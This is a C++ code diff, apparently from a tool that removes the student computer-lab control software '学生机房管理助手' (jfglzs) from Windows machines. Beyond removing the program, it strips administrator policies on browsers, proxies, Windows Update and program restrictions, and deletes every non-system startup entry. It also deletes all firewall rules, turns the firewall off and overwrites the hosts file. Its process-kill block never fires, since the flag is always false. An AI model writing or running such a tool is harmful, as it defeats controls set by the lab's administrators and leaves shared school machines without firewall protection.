+                        std::wstring shortcutPath = desktopPath + L"\\学生机房管理助手.lnk";
+                        if (DeleteFileW(shortcutPath.c_str())) {
+                            std::wcout << L"  [删除] " << shortcutPath << std::endl;
+                        }
+                    };
+                    
+                    // 获取所有用户目录
+                    std::wstring usersPath = L"C:\\Users";
+                    WIN32_FIND_DATAW findData;
+                    HANDLE hFind = FindFirstFileW((usersPath + L"\\*").c_str(), &findData);
+                    if (hFind != INVALID_HANDLE_VALUE) {
+                        do {
+                            std::wstring userName = findData.cFileName;
+                            if (userName != L"." && userName != L".." && 
+                                (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                                std::wstring userPath = usersPath + L"\\" + userName;
+                                std::wstring desktopPath = userPath + L"\\Desktop";
+                                std::wstring shortcutPath = desktopPath + L"\\学生机房管理助手.lnk";
+                                if (DeleteFileW(shortcutPath.c_str())) {
+                                    std::wcout << L"  [删除] " << shortcutPath << std::endl;
+                                }
+                            }
+                        } while (FindNextFileW(hFind, &findData));
+                        FindClose(hFind);
+                    }
+                    
+                    // 删除公共桌面快捷方式
+                    std::wstring publicDesktopPath = L"C:\\Users\\Public\\Desktop";
+                    std::wstring publicShortcutPath = publicDesktopPath + L"\\学生机房管理助手.lnk";
+                    if (DeleteFileW(publicShortcutPath.c_str())) {
+                        std::wcout << L"  [删除] " << publicShortcutPath << std::endl;
+                    }
+                    
+                    std::wcout << L"  [完成] 桌面快捷方式清理完成" << std::endl;
+                }
+                
+                std::wcout << L"\n=== 第一阶段完成 ===" << std::endl;
+                std::wcout << L"\n[信息] 继续执行第二阶段..." << std::endl;
+                std::wcout << L"=== 第二阶段：完全删除学生机房管理助手 ===" << std::endl;
+                std::wcout << L"正在完全删除学生机房管理助手..." << std::endl;
+
+                std::wcout << L"[1/13] 正在恢复Windows安全中心与Defender..." << std::endl;
+                {
+                    HKEY hKey;
+                    DWORD enabled = 0;
+                    DWORD disabled = 1;
+
+                    // 1. 安全恢复策略键值（HKLM\Policies）— 设为0而非删除，避免SecurityHealthService崩溃循环
+                    const wchar_t* policyPaths[] = {
+                        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
+                        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
+                        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet",
+                        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager"
+                    };
+
+                    const wchar_t* disableValues[] = {
+                        L"DisableAntiSpyware", L"DisableAntiVirus", L"DisableRealtimeMonitoring",
+                        L"DisableBehaviorMonitoring", L"DisableOnAccessProtection",
+                        L"DisableScanOnRealtimeEnable", L"DisableIOAVProtection",
+                        L"DisableScriptScanning", L"SubmitSamplesConsent",
+                        L"SpynetReporting", L"DisableBlockAtFirstSeen",
+                        L"EnableNetworkProtection", L"AllowFastStartup",
+                        L"DisableEmailScanning", L"DisableCorscan"
+                    };
+                    DWORD valZero = 0;
+
+                    for (const auto* path : policyPaths) {
+                        if (RegCreateKeyW(HKEY_LOCAL_MACHINE, path, &hKey) == ERROR_SUCCESS) {
+                            // 将所有可能的禁用值设为0（启用），而非删除，保持注册表结构完整
+                            for (const auto* valName : disableValues) {
+                                RegSetValueExW(hKey, valName, 0, REG_DWORD, (const BYTE*)&valZero, sizeof(valZero));
+                            }
+                            RegCloseKey(hKey);
+                        }
+                    }
+
+                    // 2. 删除用户级禁用项（HKLM\Microsoft\Windows Defender）
+                    if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"DisableAntiSpyware");
+                        RegDeleteValueW(hKey, L"DisableAntiVirus");
+                        RegDeleteValueW(hKey, L"DisableRealtimeMonitoring");
+                        RegDeleteValueW(hKey, L"PausedComponents");
+                        RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegSetValueExW(hKey, L"DisableAntiVirus", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegCloseKey(hKey);
+                    }
+
+                    // 3. 启用实时保护设置
+                    if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", &hKey) == ERROR_SUCCESS) {
+                        RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegSetValueExW(hKey, L"DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegSetValueExW(hKey, L"DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegSetValueExW(hKey, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegSetValueExW(hKey, L"DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegCloseKey(hKey);
+                    }
+
+                    // 4. 启用Spynet（云端保护）
+                    if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Spynet", &hKey) == ERROR_SUCCESS) {
+                        RegSetValueExW(hKey, L"SpynetReporting", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegSetValueExW(hKey, L"DisableBlockAtFirstSeen", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegSetValueExW(hKey, L"SubmitSamplesConsent", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegCloseKey(hKey);
+                    }
+
+                    // 5. 启用网络安全保护
+                    if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Network Protection", &hKey) == ERROR_SUCCESS) {
+                        RegSetValueExW(hKey, L"EnableNetworkProtection", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegCloseKey(hKey);
+                    }
+
+                    // 6. 启用受控文件夹访问
+                    if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access", &hKey) == ERROR_SUCCESS) {
+                        RegSetValueExW(hKey, L"EnableControlledFolderAccess", 0, REG_DWORD, (const BYTE*)&enabled, 4);
+                        RegCloseKey(hKey);
+                    }
+
+                    // 7. 删除潜在的排除项（恶意软件可能添加的排除）
+                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+                        DWORD index = 0;
+                        wchar_t valueName[256];
+                        DWORD valueNameLen;
+                        while (true) {
+                            valueNameLen = 256;
+                            LONG ret = RegEnumValueW(hKey, index, valueName, &valueNameLen, NULL, NULL, NULL, NULL);
+                            if (ret != ERROR_SUCCESS) break;
+                            RegDeleteValueW(hKey, valueName);
+                        }
+                        RegCloseKey(hKey);
+                    }
+                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+                        DWORD index = 0;
+                        wchar_t valueName[1024];
+                        DWORD valueNameLen;
+                        while (true) {
+                            valueNameLen = 1024;
+                            LONG ret = RegEnumValueW(hKey, index, valueName, &valueNameLen, NULL, NULL, NULL, NULL);
+                            if (ret != ERROR_SUCCESS) break;
+                            RegDeleteValueW(hKey, valueName);
+                        }
+                        RegCloseKey(hKey);
+                    }
+                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+                        DWORD index = 0;
+                        wchar_t valueName[256];
+                        DWORD valueNameLen;
+                        while (true) {
+                            valueNameLen = 256;
+                            LONG ret = RegEnumValueW(hKey, index, valueName, &valueNameLen, NULL, NULL, NULL, NULL);
+                            if (ret != ERROR_SUCCESS) break;
+                            RegDeleteValueW(hKey, valueName);
+                        }
+                        RegCloseKey(hKey);
+                    }
+
+                    // 8. 启用所有Defender服务并设置自动启动
+                    const wchar_t* services[] = {
+                        L"wscsvc", L"WinDefend", L"WdNisSvc", L"WdNisDrv", L"WdBoot", L"WdFilter"
+                    };
+
+                    for (const auto* svc : services) {
+                        std::wstring startCmd = L"sc config ";
+                        startCmd += svc;
+                        startCmd += L" start= auto 2>nul";
+                        _wsystem(startCmd.c_str());
+
+                        std::wstring startSvc = L"sc start ";
+                        startSvc += svc;
+                        startSvc += L" 2>nul";
+                        _wsystem(startSvc.c_str());
+                    }
+
+                    // 9. 删除IFEO中的恶意劫持
+                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+                        DWORD index = 0;
+                        wchar_t subKeyName[256];
+                        DWORD subKeyNameLen;
+                        while (true) {
+                            subKeyNameLen = 256;
+                            LONG ret = RegEnumKeyExW(hKey, index, subKeyName, &subKeyNameLen, NULL, NULL, NULL, NULL);
+                            if (ret != ERROR_SUCCESS) break;
+                            std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
+                            keyPath += subKeyName;
+                            HKEY hSubKey;
+                            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS) {
+                                wchar_t debugger[1024];
+                                DWORD debuggerLen = sizeof(debugger);
+                                if (RegQueryValueExW(hSubKey, L"Debugger", NULL, NULL, (LPBYTE)debugger, &debuggerLen) == ERROR_SUCCESS) {
+                                    std::wstring dbgStr = debugger;
+                                    std::transform(dbgStr.begin(), dbgStr.end(), dbgStr.begin(), ::towlower);
+                                    if (dbgStr.find(L"cmd") != std::wstring::npos ||
+                                        dbgStr.find(L"exit") != std::wstring::npos ||
+                                        dbgStr.find(L"jfglzs") != std::wstring::npos) {
+                                        RegDeleteValueW(hSubKey, L"Debugger");
+                                    }
+                                }
+                                RegCloseKey(hSubKey);
+                            }
+                            index++;
+                        }
+                        RegCloseKey(hKey);
+                    }
+                    // 额外清除 tasklist.exe 和 taskkill.exe 的 IFEO
+                    auto clearIFEO = [](const wchar_t* exeName) {
+                        HKEY hKey;
+                        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, (std::wstring(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\") + exeName).c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                            RegDeleteKeyW(hKey, L""); RegCloseKey(hKey);
+                        }
+                        if (RegOpenKeyExW(HKEY_CURRENT_USER, (std::wstring(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\") + exeName).c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                            RegDeleteKeyW(hKey, L""); RegCloseKey(hKey);
+                        }
+                    };
+                    clearIFEO(L"tasklist.exe");
+                    clearIFEO(L"taskkill.exe");
+
+                    std::wcout << L"  [完成] Windows安全中心与Defender已恢复" << std::endl;
+                }
+
+                std::wcout << L"[2/13] 正在恢复安全模式启动..." << std::endl;
+                {
+                    HKEY hKey;
+                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+                        RegDeleteKeyW(hKey, L"Minimal");
+                        RegDeleteKeyW(hKey, L"Network");
+                        RegCloseKey(hKey);
+                    }
+                    system("reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\" /f 2>nul");
+                    system("reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\" /f 2>nul");
+                    std::wcout << L"  [完成] 安全模式启动已恢复" << std::endl;
+                }
+
+                std::wcout << L"[3/13] 正在扫描并删除相关计划任务..." << std::endl;
+                {
+                    // 删除与学生机房管理助手相关的计划任务
+                    system("schtasks /delete /tn \"jfglzs*\" /f 2>nul");
+                    system("schtasks /delete /tn \"学生机房*\" /f 2>nul");
+                    system("schtasks /delete /tn \"JFGlzs*\" /f 2>nul");
+                    system("schtasks /delete /tn \"zm*\" /f 2>nul");
+                    std::wcout << L"  [完成] 相关计划任务已清理" << std::endl;
+                }
+
+                std::wcout << L"[4/13] 正在清理非系统必须启动项..." << std::endl;
+                {
+                    auto isSystemStartup = [](const std::wstring& nameLower) -> bool {
+                        static const wchar_t* sysItems[] = {
+                            L"securityhealthsystray", L"windows defender", L"onedrive",
+                            L"runtimebroker", L"searchindexer", L"ctfmon",
+                            L"windows security", L"microsoft windows defender",
+                            L"securityhealth", L"windowsdefender"
+                        };
+                        for (const auto* item : sysItems) {
+                            if (nameLower.find(item) != std::wstring::npos) return true;
+                        }
+                        return false;
+                    };
+
+                    auto cleanRunKey = [&isSystemStartup](HKEY root, const wchar_t* path) {
+                        HKEY hKey;
+                        if (RegOpenKeyExW(root, path, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+                            DWORD index = 0;
+                            wchar_t valueName[256];
+                            DWORD valueNameLen;
+                            while (true) {
+                                valueNameLen = 256;
+                                LONG ret = RegEnumValueW(hKey, index, valueName, &valueNameLen, NULL, NULL, NULL, NULL);
+                                if (ret != ERROR_SUCCESS) break;
+                                std::wstring nameLower = valueName;
+                                std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::towlower);
+                                if (!isSystemStartup(nameLower)) {
+                                    RegDeleteValueW(hKey, valueName);
+                                } else {
+                                    ++index;
+                                }
+                            }
+                            RegCloseKey(hKey);
+                        }
+                    };
+
+                    cleanRunKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+                    cleanRunKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run");
+                    cleanRunKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
+                    cleanRunKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
+
+                    // 清理启动文件夹
+                    auto cleanStartupFolder = [](const std::wstring& folderPath) {
+                        std::wstring searchPath = folderPath + L"\\*";
+                        WIN32_FIND_DATAW findData;
+                        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+                        if (hFind != INVALID_HANDLE_VALUE) {
+                            do {
+                                std::wstring name = findData.cFileName;
+                                if (name == L"." || name == L"..") continue;
+                                std::wstring lowerName = name;
+                                std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);
+                                if (lowerName.find(L"security") == std::wstring::npos &&
+                                    lowerName.find(L"defender") == std::wstring::npos) {
+                                    std::wstring fullPath = folderPath + L"\\" + name;
+                                    DeleteFileW(fullPath.c_str());
+                                }
+                            } while (FindNextFileW(hFind, &findData));
+                            FindClose(hFind);
+                        }
+                    };
+
+                    wchar_t startupPath[MAX_PATH];
+                    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK) {
+                        cleanStartupFolder(startupPath);
+                    }
+                    if (SHGetFolderPathW(NULL, CSIDL_COMMON_STARTUP, NULL, 0, startupPath) == S_OK) {
+                        cleanStartupFolder(startupPath);
+                    }
+
+                    std::wcout << L"  [完成] 非系统必须启动项已清理" << std::endl;
+                }
+
+                std::wcout << L"[5/13] 正在修复Chrome浏览器策略..." << std::endl;
+                {
+                    HKEY hKey;
+                    if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Google\\Chrome", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"AllowDinosaurEasterEgg");
+                        RegDeleteValueW(hKey, L"AllowSurfingGame");
+                        RegDeleteValueW(hKey, L"DeveloperToolsAvailability");
+                        RegDeleteValueW(hKey, L"DownloadRestrictions");
+                        RegDeleteValueW(hKey, L"WebWidgetAllowed");
+                        RegDeleteValueW(hKey, L"SaveAs");
+                        RegCloseKey(hKey);
+                    }
+                    if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Google\\Chrome", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"AllowDinosaurEasterEgg");
+                        RegDeleteValueW(hKey, L"AllowSurfingGame");
+                        RegDeleteValueW(hKey, L"DeveloperToolsAvailability");
+                        RegDeleteValueW(hKey, L"DownloadRestrictions");
+                        RegDeleteValueW(hKey, L"WebWidgetAllowed");
+                        RegDeleteValueW(hKey, L"SaveAs");
+                        RegCloseKey(hKey);
+                    }
+                    std::wcout << L"  [完成] Chrome浏览器策略已修复" << std::endl;
+                }
+
+                std::wcout << L"[6/13] 正在恢复被禁用的程序运行..." << std::endl;
+            {
+                HKEY hKey;
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"RestrictRun");
+                    RegDeleteValueW(hKey, L"RestrictApps");
+                    RegCloseKey(hKey);
+                }
+                RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BlockedApplications");
+                system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RestrictRun\" /f 2>nul");
+                std::wcout << L"  [完成] 已恢复程序运行" << std::endl;
+            }
+            
+            std::wcout << L"[7/13] 正在恢复扫雷、纸牌等小游戏..." << std::endl;
+            {
+                HKEY hKey;
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.mine", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteKeyW(hKey, L"");
+                    RegCloseKey(hKey);
+                }
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.sol", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteKeyW(hKey, L"");
+                    RegCloseKey(hKey);
+                }
+                std::wcout << L"  [完成] 已恢复小游戏" << std::endl;
+            }
+            
+            std::wcout << L"[8/13] 正在清除浏览器主页..." << std::endl;
+            {
+                HKEY hKey;
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"Homepage");
+                    RegDeleteValueW(hKey, L"Start Page");
+                    RegSetValueExW(hKey, L"Homepage", 0, REG_SZ, (const BYTE*)L"about:blank\0", 24);
+                    RegCloseKey(hKey);
+                }
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Internet Explorer\\Main", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"Start Page");
+                    RegCloseKey(hKey);
+                }
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\" /v \"Start Page\" /d \"about:blank\" /f 2>nul");
+                std::wcout << L"  [完成] 已清除浏览器主页" << std::endl;
+            }
+            
+            std::wcout << L"[9/13] 正在恢复注册表编辑器..." << std::endl;
+            {
+                HKEY hKey;
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableRegistryTools");
+                    RegDeleteValueW(hKey, L"DisableRegistryTools1");
+                    RegCloseKey(hKey);
+                }
+                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableRegistryTools");
+                    RegCloseKey(hKey);
+                }
+                std::wcout << L"  [完成] 注册表编辑器已恢复" << std::endl;
+            }
+            
+            std::wcout << L"[10/13] 正在恢复任务管理器..." << std::endl;
+            {
+                HKEY hKey;
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableTaskMgr");
+                    RegCloseKey(hKey);
+                }
+                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableTaskMgr");
+                    RegCloseKey(hKey);
+                }
+                std::wcout << L"  [完成] 任务管理器已恢复" << std::endl;
+            }
+            
+            std::wcout << L"[11/13] 正在恢复CMD和PowerShell..." << std::endl;
+            {
+                HKEY hKey;
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableCMD");
+                    RegDeleteValueW(hKey, L"DisableCMDHidden");
+                    RegCloseKey(hKey);
+                }
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableCMD");
+                    RegDeleteValueW(hKey, L"DisableCMDHidden");
+                    RegCloseKey(hKey);
+                }
+                std::wcout << L"  [完成] CMD和PowerShell已恢复" << std::endl;
+            }
+            
+            std::wcout << L"[12/13] 正在清除网站访问限制..." << std::endl;
+            {
+                system("netsh advfirewall firewall delete rule name=all 2>nul");
+                HKEY hKey;
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 0;
+                    RegSetValueExW(hKey, L"EnableFirewall", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 0;
+                    RegSetValueExW(hKey, L"EnableFirewall", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+                
+                system("attrib -h -r -s C:\\Windows\\System32\\drivers\\etc\\hosts 2>nul");
+                FILE* hostsFile = _wfopen(L"C:\\Windows\\System32\\drivers\\etc\\hosts", L"w");
+                if (hostsFile) {
+                    fwprintf(hostsFile, L"# Copyright (c) 1993-2009 Microsoft Corp.\n");
+                    fwprintf(hostsFile, L"#\n");
+                    fwprintf(hostsFile, L"# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n");
+                    fwprintf(hostsFile, L"#\n");
+                    fwprintf(hostsFile, L"# This file contains the mappings of IP addresses to host names. Each\n");
+                    fwprintf(hostsFile, L"# entry should be kept on an individual line. The IP address should\n");
+                    fwprintf(hostsFile, L"# be placed in the first column followed by the corresponding host name.\n");
+                    fwprintf(hostsFile, L"# The IP address and the host name should be separated by at least one\n");
+                    fwprintf(hostsFile, L"# space.\n");
+                    fwprintf(hostsFile, L"#\n");
+                    fwprintf(hostsFile, L"# Additionally, comments (such as these) may be inserted on individual\n");
+                    fwprintf(hostsFile, L"# lines or following the machine name denoted by a '#' symbol.\n");
+                    fwprintf(hostsFile, L"#\n");
+                    fwprintf(hostsFile, L"# For example:\n");
+                    fwprintf(hostsFile, L"#\n");
+                    fwprintf(hostsFile, L"#      102.54.94.97     rhino.acme.com          # source server\n");
+                    fwprintf(hostsFile, L"#       38.25.63.10     x.acme.com              # x client host\n");
+                    fwprintf(hostsFile, L"\n");
+                    fwprintf(hostsFile, L"# localhost name resolution is handled within DNS itself.\n");
+                    fwprintf(hostsFile, L"#       127.0.0.1       localhost\n");
+                    fwprintf(hostsFile, L"#       ::1             localhost\n");
+                    fclose(hostsFile);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"ProxyEnable");
+                    RegDeleteValueW(hKey, L"ProxyServer");
+                    RegDeleteValueW(hKey, L"ProxyOverride");
+                    RegDeleteValueW(hKey, L"AutoConfigURL");
+                    RegDeleteValueW(hKey, L"AutoDetect");
+                    RegCloseKey(hKey);
+                }
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 0;
+                    RegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegDeleteValueW(hKey, L"ProxyServer");
+                    RegDeleteValueW(hKey, L"AutoConfigURL");
+                    RegCloseKey(hKey);
+                }
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"ProxyDisable");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"WUServer");
+                    RegDeleteValueW(hKey, L"WUStatusServer");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\0\\Paths", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.htm", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteKeyW(hKey, L"");
+                    RegCloseKey(hKey);
+                }
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.html", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteKeyW(hKey, L"");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoNetConnectDisconnect");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoNetConnectDisconnect");
+                    RegCloseKey(hKey);
+                }
+                
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+                
+                RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects");
+                
+                {
+                    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                    if (hSnapshot != INVALID_HANDLE_VALUE) {
+                        PROCESSENTRY32W pe32;
+                        pe32.dwSize = sizeof(pe32);
+                        if (Process32FirstW(hSnapshot, &pe32)) {
+                            do {
+                                std::wstring exeName = pe32.szExeFile;
+                                std::wstring lowerName = exeName;
+                                for (auto& c : lowerName) c = towlower(c);
+                                
+                                bool shouldKill = false;
+                                
+                                if (lowerName.find(L"chrome") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"edge") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"firefox") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"msedge") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"browser") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"explorer") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"cmd") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"powershell") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"windows") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"microsoft") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"system") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"svchost") != std::wstring::npos) shouldKill = false;
+                                if (lowerName.find(L"cmdplus") != std::wstring::npos) shouldKill = false;
+                                
+                                if (shouldKill) {
+                                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
+                                    if (hProcess) {
+                                        TerminateProcess(hProcess, 1);
+                                        CloseHandle(hProcess);
+                                        std::wcout << L"[结束] " << exeName << std::endl;
+                                    }
+                                }
+                            } while (Process32NextW(hSnapshot, &pe32));
+                        }
+                        CloseHandle(hSnapshot);
